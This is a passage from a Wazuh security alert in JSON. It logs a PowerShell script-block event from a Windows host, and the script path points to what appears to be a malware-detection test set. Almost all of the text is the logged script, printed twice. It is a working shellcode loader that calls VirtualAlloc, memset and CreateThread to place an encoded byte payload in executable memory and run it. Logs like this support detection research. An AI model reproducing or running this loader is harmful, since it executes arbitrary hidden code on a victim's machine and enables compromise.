powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304534.4379763","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:33.8925738Z","eventRecordID":"145974","processID":"4308","threadID":"8976","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$sf73 = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $sf73 -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc4,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x51,0xb8,0xf6,0x94,0x1b,0xf9,0x83,0xc2,0x04,0x31,0x42,0x16,0x03,0x42,0x16,0xe2,0x03,0x68,0xf3,0x7b,0xeb,0x91,0x04,0x1c,0x62,0x74,0x35,0x1c,0x10,0xfc,0x66,0xac,0x53,0x50,0x8b,0x47,0x31,0x41,0x18,0x25,0x9d,0x66,0xa9,0x80,0xfb,0x49,0x2a,0xb8,0x3f,0xcb,0xa8,0xc3,0x13,0x2b,0x90,0x0b,0x66,0x2a,0xd5,0x76,0x8a,0x7e,0x8e,0xfd,0x38,0x6f,0xbb,0x48,0x80,0x04,0xf7,0x5d,0x80,0xf9,0x40,0x5f,0xa1,0xaf,0xdb,0x06,0x61,0x51,0x0f,0x33,0x28,0x49,0x4c,0x7e,0xe3,0xe2,0xa6,0xf4,0xf2,0x22,0xf7,0xf5,0x58,0x0b,0x37,0x04,0xa1,0x4b,0xf0,0xf7,0xd4,0xa5,0x02,0x85,0xee,0x71,0x78,0x51,0x7b,0x62,0xda,0x12,0xdb,0x4e,0xda,0xf7,0xbd,0x05,0xd0,0xbc,0xca,0x42,0xf5,0x43,0x1f,0xf9,0x01,0xcf,0x9e,0x2e,0x80,0x8b,0x84,0xea,0xc8,0x48,0xa5,0xab,0xb4,0x3f,0xda,0xac,0x16,0x9f,0x7e,0xa6,0xbb,0xf4,0xf3,0xe5,0xd3,0x64,0x6e,0x62,0x24,0x11,0x07,0xe3,0x4a,0x88,0xb3,0x9b,0xde,0x3d,0x1d,0x5b,0x20,0x14,0x50,0xb8,0x8d,0xc4,0xc1,0x6d,0x61,0x83,0xdf,0xc7,0xfc,0xf4,0xe0,0x3d,0xad,0xa9,0x74,0xbd,0x01,0x1d,0xe2,0xf4,0x4d,0xd9,0xf2,0xf6,0x8d,0x35,0xa8,0xc3,0xbe,0x2f,0x78,0x2c,0x91,0xc7,0xd7,0xa5,0x8e,0xde,0x28,0x60,0x39,0x18,0x85,0xe3,0x3a,0xa7,0x49,0x70,0x69,0xf4,0xda,0x2f,0xdd,0xac,0xb4,0x24,0xb4,0x7e,0x7f,0x44,0xe2,0xe9,0x15,0xb0,0x52,0x45,0xba,0x97,0x3f,0x3f,0x54,0x35,0xc6,0xa7,0xdf,0xba,0x13,0x52,0xdf,0x30,0x96,0x12,0xaa,0x57,0xce,0x5c,0xe1,0x0a,0x59,0x62,0xdc,0x21,0x26,0xf4,0xde,0xa5,0xa6,0x04,0xb6,0xc5,0xa6,0x44,0x46,0x95,0xce,0x1c,0xe2,0x4a,0xea,0x62,0x3f,0xff,0xa7,0xcf,0x36,0xe7,0x1f,0x98,0x48,0xc8,0x9f,0x58,0x1b,0x5e,0xc8,0x4a,0x0d,0xd7,0xea,0x94,0xe4,0x6d,0x2a,0x1e,0xcb,0xe5,0xac,0xde,0x10,0x7c,0x72,0x95,0x73,0x27,0xb0,0x09,0x93,0x51,0xc9,0x49,0x9c,0x53,0x05,0x8f,0x4c,0xa5,0x5f,0xdd,0xbe,0xf4,0xa8,0x15,0x90,0xc5,0xe2,0x55;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$0HM=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($0HM.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$0HM,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: ba7987aa-3c3d-4987-b33e-3a05b8cebcb6\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\778.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$sf73 = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $sf73 -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc4,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x51,0xb8,0xf6,0x94,0x1b,0xf9,0x83,0xc2,0x04,0x31,0x42,0x16,0x03,0x42,0x16,0xe2,0x03,0x68,0xf3,0x7b,0xeb,0x91,0x04,0x1c,0x62,0x74,0x35,0x1c,0x10,0xfc,0x66,0xac,0x53,0x50,0x8b,0x47,0x31,0x41,0x18,0x25,0x9d,0x66,0xa9,0x80,0xfb,0x49,0x2a,0xb8,0x3f,0xcb,0xa8,0xc3,0x13,0x2b,0x90,0x0b,0x66,0x2a,0xd5,0x76,0x8a,0x7e,0x8e,0xfd,0x38,0x6f,0xbb,0x48,0x80,0x04,0xf7,0x5d,0x80,0xf9,0x40,0x5f,0xa1,0xaf,0xdb,0x06,0x61,0x51,0x0f,0x33,0x28,0x49,0x4c,0x7e,0xe3,0xe2,0xa6,0xf4,0xf2,0x22,0xf7,0xf5,0x58,0x0b,0x37,0x04,0xa1,0x4b,0xf0,0xf7,0xd4,0xa5,0x02,0x85,0xee,0x71,0x78,0x51,0x7b,0x62,0xda,0x12,0xdb,0x4e,0xda,0xf7,0xbd,0x05,0xd0,0xbc,0xca,0x42,0xf5,0x43,0x1f,0xf9,0x01,0xcf,0x9e,0x2e,0x80,0x8b,0x84,0xea,0xc8,0x48,0xa5,0xab,0xb4,0x3f,0xda,0xac,0x16,0x9f,0x7e,0xa6,0xbb,0xf4,0xf3,0xe5,0xd3,0x64,0x6e,0x62,0x24,0x11,0x07,0xe3,0x4a,0x88,0xb3,0x9b,0xde,0x3d,0x1d,0x5b,0x20,0x14,0x50,0xb8,0x8d,0xc4,0xc1,0x6d,0x61,0x83,0xdf,0xc7,0xfc,0xf4,0xe0,0x3d,0xad,0xa9,0x74,0xbd,0x01,0x1d,0xe2,0xf4,0x4d,0xd9,0xf2,0xf6,0x8d,0x35,0xa8,0xc3,0xbe,0x2f,0x78,0x2c,0x91,0xc7,0xd7,0xa5,0x8e,0xde,0x28,0x60,0x39,0x18,0x85,0xe3,0x3a,0xa7,0x49,0x70,0x69,0xf4,0xda,0x2f,0xdd,0xac,0xb4,0x24,0xb4,0x7e,0x7f,0x44,0xe2,0xe9,0x15,0xb0,0x52,0x45,0xba,0x97,0x3f,0x3f,0x54,0x35,0xc6,0xa7,0xdf,0xba,0x13,0x52,0xdf,0x30,0x96,0x12,0xaa,0x57,0xce,0x5c,0xe1,0x0a,0x59,0x62,0xdc,0x21,0x26,0xf4,0xde,0xa5,0xa6,0x04,0xb6,0xc5,0xa6,0x44,0x46,0x95,0xce,0x1c,0xe2,0x4a,0xea,0x62,0x3f,0xff,0xa7,0xcf,0x36,0xe7,0x1f,0x98,0x48,0xc8,0x9f,0x58,0x1b,0x5e,0xc8,0x4a,0x0d,0xd7,0xea,0x94,0xe4,0x6d,0x2a,0x1e,0xcb,0xe5,0xac,0xde,0x10,0x7c,0x72,0x95,0x73,0x27,0xb0,0x09,0x93,0x51,0xc9,0x49,0x9c,0x53,0x05,0x8f,0x4c,0xa5,0x5f,0xdd,0xbe,0xf4,0xa8,0x15,0x90,0xc5,0xe2,0x55;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$0HM=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($0HM.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$0HM,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"ba7987aa-3c3d-4987-b33e-3a05b8cebcb6","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\778.ps1"}}},"location":"EventChannel"}
